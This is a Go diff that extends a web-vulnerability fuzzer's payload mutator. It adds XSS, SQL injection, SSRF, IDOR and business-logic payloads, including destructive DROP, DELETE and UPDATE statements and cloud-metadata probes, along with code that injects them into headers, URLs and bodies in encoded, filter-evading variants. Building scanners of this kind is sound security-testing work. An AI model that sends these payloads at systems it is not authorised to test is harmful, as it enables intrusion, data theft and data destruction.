@@ -27,6 +27,15 @@ func NewMutator() *Mutator {
 
 // initPayloads initializes the attack payloads
 func (m *Mutator) initPayloads() {
+	// Create base payloads first
+	m.createBasePayloads()
+
+	// Then create encoded variations
+	m.createEncodedVariations()
+}
+
+// createBasePayloads creates the base attack payloads
+func (m *Mutator) createBasePayloads() {
 	// A01:2021 - Broken Access Control
 	m.payloads[common.AttackBrokenAccessControl] = []common.Payload{
 		{Type: common.AttackBrokenAccessControl, Value: "/admin", Variant: "admin_access"},
@@ -42,6 +51,19 @@ func (m *Mutator) initPayloads() {
 		{Type: common.AttackIDOR, Value: "999999", Variant: "user_id_high"},
 		{Type: common.AttackIDOR, Value: "admin", Variant: "admin_id"},
 		{Type: common.AttackIDOR, Value: "true", Variant: "boolean_id"},
+		{Type: common.AttackIDOR, Value: "100", Variant: "user_id_100"},
+		{Type: common.AttackIDOR, Value: "1000", Variant: "user_id_1000"},
+		{Type: common.AttackIDOR, Value: "12345", Variant: "user_id_12345"},
+		{Type: common.AttackIDOR, Value: "67890", Variant: "user_id_67890"},
+		{Type: common.AttackIDOR, Value: "111111", Variant: "user_id_111111"},
+		{Type: common.AttackIDOR, Value: "222222", Variant: "user_id_222222"},
+		{Type: common.AttackIDOR, Value: "333333", Variant: "user_id_333333"},
+		{Type: common.AttackIDOR, Value: "444444", Variant: "user_id_444444"},
+		{Type: common.AttackIDOR, Value: "555555", Variant: "user_id_555555"},
+		{Type: common.AttackIDOR, Value: "666666", Variant: "user_id_666666"},
+		{Type: common.AttackIDOR, Value: "777777", Variant: "user_id_777777"},
+		{Type: common.AttackIDOR, Value: "888888", Variant: "user_id_888888"},
+		{Type: common.AttackIDOR, Value: "999999", Variant: "user_id_999999"},
 	}
 
 	m.payloads[common.AttackPrivilegeEscalation] = []common.Payload{
@@ -84,6 +106,19 @@ func (m *Mutator) initPayloads() {
 		{Type: common.AttackXSS, Value: "'><script>alert(1)</script>", Variant: "quote_break"},
 		{Type: common.AttackXSS, Value: "<iframe src=javascript:alert(1)>", Variant: "iframe"},
 		{Type: common.AttackXSS, Value: "';alert(1);//", Variant: "js_injection"},
+		{Type: common.AttackXSS, Value: "<script>alert('XSS')</script>", Variant: "alert_xss"},
+		{Type: common.AttackXSS, Value: "<script>confirm('XSS')</script>", Variant: "confirm_xss"},
+		{Type: common.AttackXSS, Value: "<script>prompt('XSS')</script>", Variant: "prompt_xss"},
+		{Type: common.AttackXSS, Value: "<img src=x onerror=alert(1)>", Variant: "img_src_x"},
+		{Type: common.AttackXSS, Value: "<body onload=alert(1)>", Variant: "body_onload"},
+		{Type: common.AttackXSS, Value: "<input onfocus=alert(1) autofocus>", Variant: "input_onfocus"},
+		{Type: common.AttackXSS, Value: "<textarea onblur=alert(1)>", Variant: "textarea_onblur"},
+		{Type: common.AttackXSS, Value: "<select onchange=alert(1)>", Variant: "select_onchange"},
+		{Type: common.AttackXSS, Value: "<marquee onstart=alert(1)>", Variant: "marquee_onstart"},
+		{Type: common.AttackXSS, Value: "<details ontoggle=alert(1)>", Variant: "details_ontoggle"},
+		{Type: common.AttackXSS, Value: "<video onloadstart=alert(1)>", Variant: "video_onloadstart"},
+		{Type: common.AttackXSS, Value: "<audio oncanplay=alert(1)>", Variant: "audio_oncanplay"},
+		{Type: common.AttackXSS, Value: "<form onsubmit=alert(1)>", Variant: "form_onsubmit"},
 	}
 
 	m.payloads[common.AttackSQLi] = []common.Payload{
@@ -94,6 +129,19 @@ func (m *Mutator) initPayloads() {
 		{Type: common.AttackSQLi, Value: "'; DROP TABLE users--", Variant: "drop_table"},
 		{Type: common.AttackSQLi, Value: "' OR 1=1#", Variant: "mysql_comment"},
 		{Type: common.AttackSQLi, Value: "' OR 1=1/*", Variant: "mysql_comment_block"},
+		{Type: common.AttackSQLi, Value: "' OR 1=1--", Variant: "sql_comment"},
+		{Type: common.AttackSQLi, Value: "'; SELECT SLEEP(5)--", Variant: "mysql_sleep"},
+		{Type: common.AttackSQLi, Value: "' UNION SELECT 1,2,3--", Variant: "union_columns"},
+		{Type: common.AttackSQLi, Value: "' OR 'x'='x", Variant: "string_boolean"},
+		{Type: common.AttackSQLi, Value: "'; INSERT INTO users VALUES (1,'hacker')--", Variant: "insert_attack"},
+		{Type: common.AttackSQLi, Value: "' OR username='admin'--", Variant: "admin_bypass"},
+		{Type: common.AttackSQLi, Value: "'; UPDATE users SET password='hacked'--", Variant: "update_attack"},
+		{Type: common.AttackSQLi, Value: "' OR id=1--", Variant: "id_bypass"},
+		{Type: common.AttackSQLi, Value: "'; DELETE FROM users--", Variant: "delete_attack"},
+		{Type: common.AttackSQLi, Value: "' OR 'a'='a' AND 'b'='b", Variant: "complex_boolean"},
+		{Type: common.AttackSQLi, Value: "'; CREATE TABLE hack (id int)--", Variant: "create_table"},
+		{Type: common.AttackSQLi, Value: "' OR 1=1 LIMIT 1--", Variant: "limit_bypass"},
+		{Type: common.AttackSQLi, Value: "'; ALTER TABLE users ADD COLUMN hack varchar(255)--", Variant: "alter_table"},
 	}
 
 	m.payloads[common.AttackCommandInj] = []common.Payload{
@@ -133,6 +181,13 @@ func (m *Mutator) initPayloads() {
 		{Type: common.AttackBusinessLogicFlaw, Value: "quantity=-1", Variant: "negative_quantity"},
 		{Type: common.AttackBusinessLogicFlaw, Value: "price=0", Variant: "zero_price"},
 		{Type: common.AttackBusinessLogicFlaw, Value: "amount=999999999", Variant: "overflow_amount"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "discount=200", Variant: "excessive_discount"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "balance=-1000", Variant: "negative_balance"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "limit=0", Variant: "zero_limit"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "count=999999", Variant: "max_count"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "status=approved", Variant: "force_approval"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "role=admin", Variant: "role_escalation"},
+		{Type: common.AttackBusinessLogicFlaw, Value: "permission=all", Variant: "all_permissions"},
 	}
 
 	m.payloads[common.AttackRaceCondition] = []common.Payload{
@@ -261,6 +316,22 @@ func (m *Mutator) initPayloads() {
 		{Type: common.AttackSSRF, Value: "http://169.254.169.254/latest/user-data/", Variant: "aws_userdata"},
 		{Type: common.AttackSSRF, Value: "http://127.0.0.1:6379/", Variant: "redis"},
 		{Type: common.AttackSSRF, Value: "http://127.0.0.1:27017/", Variant: "mongodb"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:3306/", Variant: "mysql"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:5432/", Variant: "postgresql"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:8080/", Variant: "localhost_8080"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:3000/", Variant: "localhost_3000"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:5000/", Variant: "localhost_5000"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:8000/", Variant: "localhost_8000"},
+		{Type: common.AttackSSRF, Value: "http://127.0.0.1:9000/", Variant: "localhost_9000"},
+		{Type: common.AttackSSRF, Value: "http://10.0.0.1/", Variant: "private_network"},
+		{Type: common.AttackSSRF, Value: "http://192.168.1.1/", Variant: "local_network"},
+		{Type: common.AttackSSRF, Value: "http://172.16.0.1/", Variant: "docker_network"},
+		{Type: common.AttackSSRF, Value: "http://0.0.0.0/", Variant: "all_interfaces"},
+		{Type: common.AttackSSRF, Value: "http://localhost/", Variant: "localhost_hostname"},
+		{Type: common.AttackSSRF, Value: "http://127.1/", Variant: "localhost_short"},
+		{Type: common.AttackSSRF, Value: "http://2130706433/", Variant: "localhost_decimal"},
+		{Type: common.AttackSSRF, Value: "http://017700000001/", Variant: "localhost_octal"},
+		{Type: common.AttackSSRF, Value: "http://0x7f000001/", Variant: "localhost_hex"},
 	}
 
 	m.payloads[common.AttackXXE] = []common.Payload{
@@ -298,7 +369,114 @@ func (m *Mutator) MutateRequest(req *common.RecordedRequest) ([]common.RecordedR
 	urlMutations := m.mutateURL(req)
 	mutations = append(mutations, urlMutations...)
 
+	// Combination mutations (multiple injection points)
+	combinationMutations := m.createCombinationMutations(req)
+	mutations = append(mutations, combinationMutations...)
+
 	return mutations, nil
+}
+
+// createCombinationMutations creates mutations that inject payloads into multiple places at once
+func (m *Mutator) createCombinationMutations(req *common.RecordedRequest) []common.RecordedRequest {
+	var mutations []common.RecordedRequest
+
+	// Get a subset of payloads for combination testing (to avoid too many combinations)
+	combinationPayloads := m.getCombinationPayloads()
+
+	for _, payload := range combinationPayloads {
+		// Header + URL combination
+		mutated := *req
+		mutated.ID = generateID()
+		mutated.Headers = copyMap(req.Headers)
+		mutated.Headers["User-Agent"] = payload.Value
+		mutated.Headers["Referer"] = payload.Value
+
+		// Also modify URL
+		parsedURL, err := url.Parse(req.URL)
+		if err == nil {
+			query := parsedURL.Query()
+			if len(query) == 0 {
+				query.Set("id", "test")
+			}
+			for key := range query {
+				query.Set(key, payload.Value)
+			}
+			parsedURL.RawQuery = query.Encode()
+			mutated.URL = parsedURL.String()
+		}
+
+		mutated.Variant = fmt.Sprintf("combination_header_url_%s", payload.Variant)
+		mutated.Timestamp = time.Now()
+		mutations = append(mutations, mutated)
+
+		// URL + Body combination
+		if req.Body != "" {
+			mutated2 := *req
+			mutated2.ID = generateID()
+
+			// Modify URL
+			parsedURL2, err := url.Parse(req.URL)
+			if err == nil {
+				query2 := parsedURL2.Query()
+				if len(query2) == 0 {
+					query2.Set("id", "test")
+				}
+				for key := range query2 {
+					query2.Set(key, payload.Value)
+				}
+				parsedURL2.RawQuery = query2.Encode()
+				mutated2.URL = parsedURL2.String()
+			}
+
+			// Modify body
+			if strings.Contains(req.ContentType, "application/json") {
+				var jsonData map[string]interface{}
+				if err := json.Unmarshal([]byte(req.Body), &jsonData); err == nil {
+					m.injectPayloadIntoJSON(jsonData, payload.Value)
+					if mutatedBody, err := json.Marshal(jsonData); err == nil {
+						mutated2.Body = string(mutatedBody)
+					}
+				}
+			} else if strings.Contains(req.ContentType, "application/x-www-form-urlencoded") {
+				formData, err := url.ParseQuery(req.Body)
+				if err == nil {
+					for key := range formData {
+						formData.Set(key, payload.Value)
+					}
+					mutated2.Body = formData.Encode()
+				}
+			}
+
+			mutated2.Variant = fmt.Sprintf("combination_url_body_%s", payload.Variant)
+			mutated2.Timestamp = time.Now()
+			mutations = append(mutations, mutated2)
+		}
+	}
+
+	return mutations
+}
+
+// getCombinationPayloads returns a subset of payloads for combination testing
+func (m *Mutator) getCombinationPayloads() []common.Payload {
+	var combinationPayloads []common.Payload
+
+	// Select one payload from each attack type for combination testing
+	attackTypes := []common.AttackType{
+		common.AttackXSS,
+		common.AttackSQLi,
+		common.AttackSSRF,
+		common.AttackIDOR,
+		common.AttackBusinessLogicFlaw,
+	}
+
+	for _, attackType := range attackTypes {
+		if payloads, exists := m.payloads[attackType]; exists && len(payloads) > 0 {
+			// Take the first payload from each attack type
+			combinationPayloads = append(combinationPayloads, payloads[0])
+		}
+	}
+
+	return combinationPayloads
 }
 
 // mutateMethod creates method variations
@@ -335,6 +513,7 @@ func (m *Mutator) mutateHeaders(req *common.RecordedRequest) []common.RecordedRe
 
 	var mutations []common.RecordedRequest
 
+	// Basic header injections
 	for header, value := range headerInjections {
 		mutated := *req
 		mutated.ID = generateID()
@@ -343,6 +522,23 @@ func (m *Mutator) mutateHeaders(req *common.RecordedRequest) []common.RecordedRe
 		mutated.Variant = fmt.Sprintf("header_%s", strings.ToLower(header))
 		mutated.Timestamp = time.Now()
 		mutations = append(mutations, mutated)
+	}
+
+	// Header payload injections
+	commonHeaders := []string{"User-Agent", "Referer", "Cookie", "Accept", "Accept-Language", "Accept-Encoding"}
+
+	for _, headerName := range commonHeaders {
+		for attackType, payloads := range m.payloads {
+			for _, payload := range payloads {
+				mutated := *req
+				mutated.ID = generateID()
+				mutated.Headers = copyMap(req.Headers)
+				mutated.Headers[headerName] = payload.Value
+				mutated.Variant = fmt.Sprintf("header_%s_%s_%s", strings.ToLower(headerName), attackType, payload.Variant)
+				mutated.Timestamp = time.Now()
+				mutations = append(mutations, mutated)
+			}
+		}
 	}
 
 	return mutations
@@ -357,6 +553,14 @@ func (m *Mutator) mutateBody(req *common.RecordedRequest) []common.RecordedReque
 		// Create JSON body mutations
 		jsonMutations := m.createJSONBodyMutations(req)
 		mutations = append(mutations, jsonMutations...)
+
+		// Create XML body mutations
+		xmlMutations := m.createXMLBodyMutations(req)
+		mutations = append(mutations, xmlMutations...)
+
+		// Create multipart body mutations
+		multipartMutations := m.createMultipartBodyMutations(req)
+		mutations = append(mutations, multipartMutations...)
 
 		// Create form body mutations
 		formMutations := m.createFormBodyMutations(req)
@@ -381,6 +585,12 @@ func (m *Mutator) mutateBody(req *common.RecordedRequest) []common.RecordedReque
 	if strings.Contains(req.ContentType, "application/xml") || strings.Contains(req.ContentType, "text/xml") {
 		xmlMutations := m.mutateXMLBody(req)
 		mutations = append(mutations, xmlMutations...)
+	}
+
+	// Multipart form data mutations
+	if strings.Contains(req.ContentType, "multipart/form-data") {
+		multipartMutations := m.mutateMultipartBody(req)
+		mutations = append(mutations, multipartMutations...)
 	}
 
 	return mutations
@@ -417,6 +627,78 @@ func (m *Mutator) createJSONBodyMutations(req *common.RecordedRequest) []common.
 			mutated.Body = string(mutatedBody)
 			mutated.ContentType = "application/json"
 			mutated.Variant = fmt.Sprintf("json_%s_%s", attackType, payload.Variant)
+			mutated.Timestamp = time.Now()
+			mutations = append(mutations, mutated)
+		}
+	}
+
+	return mutations
+}
+
+// createXMLBodyMutations creates XML body mutations when no body exists
+func (m *Mutator) createXMLBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
+	var mutations []common.RecordedRequest
+
+	// Create basic XML structure
+	baseXML := `<?xml version="1.0" encoding="UTF-8"?>
+<root>
+    <id>test</id>
+    <name>test</name>
+    <email>test@test.com</email>
+    <data>test</data>
+</root>`
+
+	for attackType, payloads := range m.payloads {
+		for _, payload := range payloads {
+			// Replace test values with payload
+			mutatedXML := strings.ReplaceAll(baseXML, ">test<", ">"+payload.Value+"<")
+
+			mutated := *req
+			mutated.ID = generateID()
+			mutated.Body = mutatedXML
+			mutated.ContentType = "application/xml"
+			mutated.Variant = fmt.Sprintf("xml_%s_%s", attackType, payload.Variant)
+			mutated.Timestamp = time.Now()
+			mutations = append(mutations, mutated)
+		}
+	}
+
+	return mutations
+}
+
+// createMultipartBodyMutations creates multipart form data mutations
+func (m *Mutator) createMultipartBodyMutations(req *common.RecordedRequest) []common.RecordedRequest {
+	var mutations []common.RecordedRequest
+
+	for attackType, payloads := range m.payloads {
+		for _, payload := range payloads {
+			// Create multipart boundary
+			boundary := "----WebKitFormBoundary" + generateID()[:8]
+
+			// Create multipart body
+			multipartBody := fmt.Sprintf(`--%s
+Content-Disposition: form-data; name="id"
+
+%s
+--%s
+Content-Disposition: form-data; name="name"
+
+%s
+--%s
+Content-Disposition: form-data; name="email"
+
+%s
+--%s
+Content-Disposition: form-data; name="data"
+
+%s
+--%s--`, boundary, payload.Value, boundary, payload.Value, boundary, payload.Value, boundary, payload.Value, boundary)
+
+			mutated := *req
+			mutated.ID = generateID()
+			mutated.Body = multipartBody
+			mutated.ContentType = "multipart/form-data; boundary=" + boundary
+			mutated.Variant = fmt.Sprintf("multipart_%s_%s", attackType, payload.Variant)
 			mutated.Timestamp = time.Now()
 			mutations = append(mutations, mutated)
 		}
@@ -552,6 +834,27 @@ func (m *Mutator) mutateXMLBody(req *common.RecordedRequest) []common.RecordedRe
 	return mutations
 }
 
+// mutateMultipartBody injects payloads into multipart form data
+func (m *Mutator) mutateMultipartBody(req *common.RecordedRequest) []common.RecordedRequest {
+	var mutations []common.RecordedRequest
+
+	for attackType, payloads := range m.payloads {
+		for _, payload := range payloads {
+			// Simple multipart injection - replace form field values
+			mutatedBody := strings.ReplaceAll(req.Body, "\r\n\r\ntest\r\n", "\r\n\r\n"+payload.Value+"\r\n")
+
+			mutated := *req
+			mutated.ID = generateID()
+			mutated.Body = mutatedBody
+			mutated.Variant = fmt.Sprintf("multipart_%s_%s", attackType, payload.Variant)
+			mutated.Timestamp = time.Now()
+			mutations = append(mutations, mutated)
+		}
+	}
+
+	return mutations
+}
+
 // mutateURL injects payloads into URL parameters and path
 func (m *Mutator) mutateURL(req *common.RecordedRequest) []common.RecordedRequest {
 	var mutations []common.RecordedRequest
@@ -661,6 +964,87 @@ func copyJSONMap(original map[string]interface{}) map[string]interface{} {
 // generateID generates a unique ID
 func generateID() string {
 	return uuid.New().String()
+}
+
+// createEncodedVariations creates URL encoded variations of existing payloads
+func (m *Mutator) createEncodedVariations() {
+	for attackType, payloads := range m.payloads {
+		var encodedPayloads []common.Payload
+
+		for _, payload := range payloads {
+			// Add original payload
+			encodedPayloads = append(encodedPayloads, payload)
+
+			// URL encoded variation
+			urlEncoded := url.QueryEscape(payload.Value)
+			if urlEncoded != payload.Value {
+				encodedPayloads = append(encodedPayloads, common.Payload{
+					Type:    payload.Type,
+					Value:   urlEncoded,
+					Variant: payload.Variant + "_url_encoded",
+				})
+			}
+
+			// Double URL encoded variation
+			doubleEncoded := url.QueryEscape(url.QueryEscape(payload.Value))
+			if doubleEncoded != payload.Value && doubleEncoded != urlEncoded {
+				encodedPayloads = append(encodedPayloads, common.Payload{
+					Type:    payload.Type,
+					Value:   doubleEncoded,
+					Variant: payload.Variant + "_double_encoded",
+				})
+			}
+
+			// Hex encoded variation (for special characters)
+			hexEncoded := m.hexEncode(payload.Value)
+			if hexEncoded != payload.Value {
+				encodedPayloads = append(encodedPayloads, common.Payload{
+					Type:    payload.Type,
+					Value:   hexEncoded,
+					Variant: payload.Variant + "_hex_encoded",
+				})
+			}
+
+			// Unicode encoded variation
+			unicodeEncoded := m.unicodeEncode(payload.Value)
+			if unicodeEncoded != payload.Value {
+				encodedPayloads = append(encodedPayloads, common.Payload{
+					Type:    payload.Type,
+					Value:   unicodeEncoded,
+					Variant: payload.Variant + "_unicode_encoded",
+				})
+			}
+		}
+
+		// Update the payloads with encoded variations
+		m.payloads[attackType] = encodedPayloads
+	}
+}
+
+// hexEncode encodes special characters as hex
+func (m *Mutator) hexEncode(input string) string {
+	var result strings.Builder
+	for _, char := range input {
+		if char < 32 || char > 126 {
+			result.WriteString(fmt.Sprintf("\\x%02x", char))
+		} else {
+			result.WriteRune(char)
+		}
+	}
+	return result.String()
+}
+
+// unicodeEncode encodes special characters as unicode
+func (m *Mutator) unicodeEncode(input string) string {
+	var result strings.Builder
+	for _, char := range input {
+		if char < 32 || char > 126 {
+			result.WriteString(fmt.Sprintf("\\u%04x", char))
+		} else {
+			result.WriteRune(char)
+		}
+	}
+	return result.String()
 }
 
 // GetAllPayloads returns all payloads organized by attack type
